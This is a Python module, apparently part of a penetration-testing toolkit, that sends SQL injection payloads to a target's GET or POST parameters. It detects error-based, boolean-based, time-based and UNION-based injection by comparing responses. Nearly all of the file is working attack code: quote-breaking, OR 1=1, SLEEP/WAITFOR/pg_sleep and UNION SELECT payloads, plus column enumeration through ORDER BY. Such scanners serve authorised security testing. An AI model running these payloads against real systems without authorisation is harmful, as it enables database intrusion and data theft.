#!/usr/bin/env python3
"""
SQL Injection Testing Techniques
All injection testing methods: error, boolean, time, and union-based
"""

import time
import hashlib
import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    from crack.themes import Colors
except ImportError:
    # Fallback for standalone execution
    class Colors:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        CYAN = '\033[96m'
        END = '\033[0m'


class SQLiTechniques:
    """All SQL injection testing techniques"""

    def __init__(self, target, method, session, timeout=10, delay=0.5, verbose=False, quick=False):
        self.target = target
        self.method = method
        self.session = session
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.quick = quick
        self.tested_count = 0

        # Parse URL components
        self.parsed_url = urlparse(target)
        self.base_params = parse_qs(self.parsed_url.query)

        # Parse POST data if provided
        self.post_params = {}

    def set_post_params(self, post_params):
        """Set POST parameters for testing"""
        self.post_params = post_params

    def _make_request(self, param, payload, original_value=''):
        """Make HTTP request with injected payload"""
        try:
            start = time.time()

            if self.method == 'GET':
                # Build URL with injected parameter
                test_params = self.base_params.copy()
                test_params[param] = [original_value + payload]
                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    self.parsed_url.scheme,
                    self.parsed_url.netloc,
                    self.parsed_url.path,
                    '',
                    query_string,
                    ''
                ))
                resp = self.session.get(test_url, timeout=self.timeout)
            else:
                # POST request
                test_data = self.post_params.copy()
                test_data[param] = [original_value + payload]
                flat_data = {k: v[0] if isinstance(v, list) else v for k, v in test_data.items()}
                resp = self.session.post(self.target, data=flat_data, timeout=self.timeout)

            elapsed = time.time() - start
            return resp, elapsed

        except requests.RequestException as e:
            if self.verbose:
                print(f"{Colors.YELLOW}      ! Request failed: {e}{Colors.END}")
            return None, 0

    def test_error_based(self, param, original_value=''):
        """Test for error-based SQL injection"""
        findings = []

        # Error-inducing payloads for different databases
        payloads = [
            ("'", "Single quote - most common SQLi test"),
            ('"', "Double quote - tests different quote handling"),
            ("\\", "Backslash - tests escape character handling"),
            ("')", "Quote with closing parenthesis"),
            ("';", "Quote with semicolon - statement terminator"),
            ("'--", "Quote with comment - MySQL/PostgreSQL"),
            ("' /*", "Quote with comment - Oracle"),
            ("\\' OR '1'='1", "Escaped quote with boolean"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--", "MySQL specific syntax error")
        ]

        if self.quick:
            payloads = payloads[:3]  # Only test first 3 in quick mode

        # Database error patterns
        error_patterns = {
            'mysql': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_',
                r'MySQLSyntaxErrorException',
                r'valid MySQL result',
                r'mysqli_',
                r'Unknown column',
                r'MySQL Error'
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'Warning.*pg_',
                r'valid PostgreSQL result',
                r'PSQLException',
                r'unterminated quoted string',
                r'syntax error at or near'
            ],
            'mssql': [
                r'Driver.*SQL[\s\-\_]*Server',
                r'OLE DB.*SQL Server',
                r'SQLServer JDBC Driver',
                r'SqlException',
                r'Unclosed quotation mark',
                r'Incorrect syntax near'
            ],
            'oracle': [
                r'Oracle.*Driver',
                r'Warning.*oci_',
                r'Warning.*ora_',
                r'Oracle error',
                r'ORA-[0-9]{5}',
                r'quoted string not properly terminated'
            ],
            'generic': [
                r'SQL',
                r'syntax error',
                r'database',
                r'query',
                r'unexpected end of SQL command',
                r'unterminated string literal'
            ]
        }

        for payload, description in payloads:
            self.tested_count += 1

            if self.verbose:
                print(f"    [ERROR-BASED] Testing: {param}={payload}")

            resp, elapsed = self._make_request(param, payload, original_value)
            if not resp:
                continue

            # Check for database errors
            found_errors = []
            db_type = None

            for db, patterns in error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, resp.text, re.I):
                        found_errors.append(pattern)
                        if db != 'generic':
                            db_type = db
                        break

            if found_errors:
                confidence = min(95, 60 + len(found_errors) * 15)

                # Extract error message snippet
                error_snippet = None
                for line in resp.text.split('\n'):
                    if any(re.search(p, line, re.I) for p in found_errors):
                        error_snippet = line[:200].strip()
                        break

                findings.append({
                    'type': 'error',
                    'payload': payload,
                    'description': description,
                    'confidence': confidence,
                    'db_type': db_type or 'unknown',
                    'errors': found_errors,
                    'snippet': error_snippet,
                    'response_time': elapsed
                })

                if self.verbose and error_snippet:
                    print(f"{Colors.GREEN}      ✓ Error detected: {error_snippet[:80]}...{Colors.END}")

            time.sleep(self.delay)

        return findings

    def test_boolean_based(self, param, baseline, original_value=''):
        """Test for boolean-based blind SQL injection"""
        findings = []

        # Boolean test pairs (true condition, false condition, description)
        test_pairs = [
            ("' AND '1'='1", "' AND '1'='2", "String-based boolean logic"),
            ("' OR '1'='1", "' OR '1'='2", "OR-based boolean test"),
            (" AND 1=1", " AND 1=2", "Numeric boolean logic"),
            (" OR 1=1", " OR 1=2", "Numeric OR test"),
            ("' AND '1' LIKE '1", "' AND '1' LIKE '2", "LIKE operator test"),
            ("' AND 1=1--", "' AND 1=2--", "With comment terminator"),
            ("' AND 'a'='a", "' AND 'a'='b", "Character comparison"),
            ("')) AND (('1'='1", "')) AND (('1'='2", "Double parenthesis test")
        ]

        if self.quick:
            test_pairs = test_pairs[:3]

        for true_payload, false_payload, description in test_pairs:
            self.tested_count += 2  # Testing two payloads

            if self.verbose:
                print(f"    [BOOLEAN-BASED] Testing: {description}")

            # Test TRUE condition
            true_resp, _ = self._make_request(param, true_payload, original_value)
            if not true_resp:
                continue

            time.sleep(self.delay)

            # Test FALSE condition
            false_resp, _ = self._make_request(param, false_payload, original_value)
            if not false_resp:
                continue

            # Analyze differences
            true_len = len(true_resp.content)
            false_len = len(false_resp.content)
            size_diff = abs(true_len - false_len)

            true_lines = true_resp.text.count('\n')
            false_lines = false_resp.text.count('\n')
            line_diff = abs(true_lines - false_lines)

            true_words = len(true_resp.text.split())
            false_words = len(false_resp.text.split())
            word_diff = abs(true_words - false_words)

            # Check if responses are different enough
            significant_diff = (
                size_diff > 50 or
                line_diff > 3 or
                word_diff > 10 or
                true_resp.status_code != false_resp.status_code
            )

            # Also check if true condition matches baseline better than false
            true_baseline_diff = abs(true_len - baseline['length'])
            false_baseline_diff = abs(false_len - baseline['length'])

            if significant_diff:
                confidence = 0
                reasons = []

                if size_diff > 100:
                    confidence += 40
                    reasons.append(f"size diff: {size_diff} bytes")
                elif size_diff > 50:
                    confidence += 25
                    reasons.append(f"size diff: {size_diff} bytes")

                if line_diff > 5:
                    confidence += 30
                    reasons.append(f"line diff: {line_diff}")
                elif line_diff > 3:
                    confidence += 20
                    reasons.append(f"line diff: {line_diff}")

                if word_diff > 20:
                    confidence += 30
                    reasons.append(f"word diff: {word_diff}")
                elif word_diff > 10:
                    confidence += 20
                    reasons.append(f"word diff: {word_diff}")

                if true_resp.status_code != false_resp.status_code:
                    confidence += 40
                    reasons.append(f"status diff: {true_resp.status_code} vs {false_resp.status_code}")

                # Bonus confidence if true matches baseline better
                if true_baseline_diff < false_baseline_diff:
                    confidence += 10
                    reasons.append("true condition matches baseline")

                confidence = min(confidence, 90)

                if confidence >= 40:  # Only record significant findings
                    findings.append({
                        'type': 'boolean',
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'description': description,
                        'confidence': confidence,
                        'true_size': true_len,
                        'false_size': false_len,
                        'size_diff': size_diff,
                        'reasons': reasons
                    })

                    if self.verbose:
                        print(f"{Colors.GREEN}      ✓ Boolean difference detected: {', '.join(reasons)}{Colors.END}")

            time.sleep(self.delay)

        return findings

    def test_time_based(self, param, original_value=''):
        """Test for time-based blind SQL injection"""
        findings = []

        # Time-based payloads for different databases
        sleep_time = 5 if not self.quick else 3

        payloads = [
            (f"' AND SLEEP({sleep_time})--", "MySQL", f"SLEEP({sleep_time})"),
            (f"'; WAITFOR DELAY '00:00:0{sleep_time}'--", "MSSQL", f"WAITFOR DELAY"),
            (f"' AND pg_sleep({sleep_time})--", "PostgreSQL", f"pg_sleep({sleep_time})"),
            (f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{sleep_time})--", "Oracle", "DBMS_PIPE"),
            (f"' AND (SELECT {sleep_time} FROM DUAL WHERE 1=1)--", "Oracle", "SELECT FROM DUAL"),
            (f" AND SLEEP({sleep_time})", "MySQL (numeric)", f"SLEEP({sleep_time})"),
            (f"' OR SLEEP({sleep_time})--", "MySQL (OR)", f"SLEEP({sleep_time})"),
            (f"')) AND SLEEP({sleep_time})--", "MySQL (nested)", f"SLEEP({sleep_time})")
        ]

        if self.quick:
            payloads = payloads[:3]

        for payload, db_type, technique_name in payloads:
            self.tested_count += 1

            if self.verbose:
                print(f"    [TIME-BASED] Testing: {db_type} - {technique_name}")

            # First, get a baseline timing without sleep
            baseline_resp, baseline_time = self._make_request(param, '', original_value)
            if not baseline_resp:
                continue

            time.sleep(0.5)

            # Now test with sleep payload
            try:
                # Increase timeout for time-based tests
                original_timeout = self.timeout
                self.timeout = self.timeout + sleep_time + 2

                resp, elapsed = self._make_request(param, payload, original_value)

                self.timeout = original_timeout

                if not resp:
                    continue

                # Check if response was delayed
                delay_diff = elapsed - baseline_time

                if delay_diff >= (sleep_time - 1):  # Allow 1 second tolerance
                    confidence = min(90, 50 + (delay_diff / sleep_time) * 40)

                    findings.append({
                        'type': 'time',
                        'payload': payload,
                        'db_type': db_type,
                        'technique': technique_name,
                        'confidence': confidence,
                        'baseline_time': baseline_time,
                        'payload_time': elapsed,
                        'delay': delay_diff,
                        'expected_delay': sleep_time
                    })

                    if self.verbose:
                        print(f"{Colors.GREEN}      ✓ Time delay detected: {delay_diff:.1f}s (expected: {sleep_time}s){Colors.END}")

            except requests.Timeout:
                # Timeout might indicate successful sleep injection
                if self.verbose:
                    print(f"{Colors.YELLOW}      ? Request timeout - possible time-based SQLi{Colors.END}")

            time.sleep(self.delay)

        return findings

    def test_union_based(self, param, baseline, original_value=''):
        """Test for UNION-based SQL injection"""
        findings = []
        max_columns = 10 if not self.quick else 5

        if self.verbose:
            print(f"    [UNION-BASED] Testing ORDER BY for column count...")

        # First, find the number of columns using ORDER BY
        column_count = 0
        for i in range(1, max_columns + 1):
            self.tested_count += 1

            payload = f"' ORDER BY {i}--"

            resp, _ = self._make_request(param, payload, original_value)
            if not resp:
                continue

            # Check for errors indicating column count exceeded
            error_indicators = [
                'Unknown column',
                'ORDER BY position',
                'ORDER BY clause',
                'out of range',
                'Column count',
                'does not exist'
            ]

            has_error = any(ind in resp.text for ind in error_indicators)
            status_changed = resp.status_code != baseline['status']
            size_changed = abs(len(resp.content) - baseline['length']) > 100

            if has_error or (status_changed and resp.status_code >= 400):
                column_count = i - 1
                if self.verbose:
                    print(f"{Colors.GREEN}      ✓ Column count found: {column_count}{Colors.END}")
                break

            time.sleep(self.delay)

        # If we found columns, test UNION SELECT
        if column_count > 0:
            # Build UNION payload with correct number of columns
            union_values = ['NULL'] * column_count

            # Test different UNION variations
            union_tests = [
                ("' UNION SELECT " + ",".join(union_values) + "--", "NULL values"),
                ("' UNION ALL SELECT " + ",".join(union_values) + "--", "UNION ALL"),
                ("') UNION SELECT " + ",".join(union_values) + "--", "With closing parenthesis"),
                ("' UNION SELECT " + ",".join(['1'] * column_count) + "--", "Numeric values"),
                ("' UNION SELECT " + ",".join([f"'{i}'" for i in range(column_count)]) + "--", "String values")
            ]

            for union_payload, description in union_tests:
                self.tested_count += 1

                if self.verbose:
                    print(f"    [UNION-BASED] Testing: {description}")

                resp, _ = self._make_request(param, union_payload, original_value)
                if not resp:
                    continue

                # Check if UNION worked
                content_changed = hashlib.md5(resp.content).hexdigest() != baseline['hash']
                no_errors = not any(err in resp.text.lower() for err in ['error', 'warning', 'fatal'])

                if content_changed and no_errors:
                    confidence = 85

                    findings.append({
                        'type': 'union',
                        'payload': union_payload,
                        'description': description,
                        'confidence': confidence,
                        'column_count': column_count,
                        'response_size': len(resp.content)
                    })

                    if self.verbose:
                        print(f"{Colors.GREEN}      ✓ UNION SELECT successful with {column_count} columns{Colors.END}")

                    break  # One successful UNION is enough

                time.sleep(self.delay)

        return findings

    def get_tested_count(self):
        """Return the total number of tests performed"""
        return self.tested_count